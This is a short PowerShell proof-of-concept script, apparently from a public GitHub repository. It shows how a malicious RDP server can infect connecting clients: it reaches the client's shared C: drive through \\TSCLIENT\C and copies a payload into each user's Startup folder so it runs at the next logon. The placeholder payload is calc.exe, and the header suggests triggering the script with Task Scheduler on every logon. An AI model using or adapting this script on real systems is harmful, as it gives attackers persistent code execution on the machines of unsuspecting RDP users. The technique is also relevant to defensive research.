<#
.SYNOPSIS
    Demonstrates copying a payload to the Startup folder of users via RDP client.

.DESCRIPTION
    This script checks if the remote client machine's C drive is accessible via the RDP client's shared folders.
    If accessible, it enumerates the user directories and attempts to copy a specified payload to each user's Startup folder.
    This ensures that the payload will execute the next time the user logs in.

.NOTES
    This script is for demonstration purposes only. Unauthorized use of this script on systems you do not own or have explicit permission to access is illegal and unethical.
    Version:    1.0
    Author:     Andreas Dieckmann

.EXAMPLE
    Run the script via Task Scheduler every time someone logs on to a malicious RDP server.

.LINK
    https://github.com/diecknet/Invoke-RDPClientInfection

#>
$C = "\\TSCLIENT\C"
$Payload = ".\calc.exe"
if(Test-Path $C) {
    $CUsers = Get-ChildItem (Join-Path $C "Users")
    foreach($UserDir in $CUsers) {
        $CUsersStartup = Join-Path $UserDir.FullName "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
        if(Test-Path $CUsersStartup -ErrorAction SilentlyContinue) {
            # We have access to this users StartUp Folder
            Copy-Item -Path $Payload -Destination (Join-Path $CUsersStartup "payload.exe")
        }
    }
}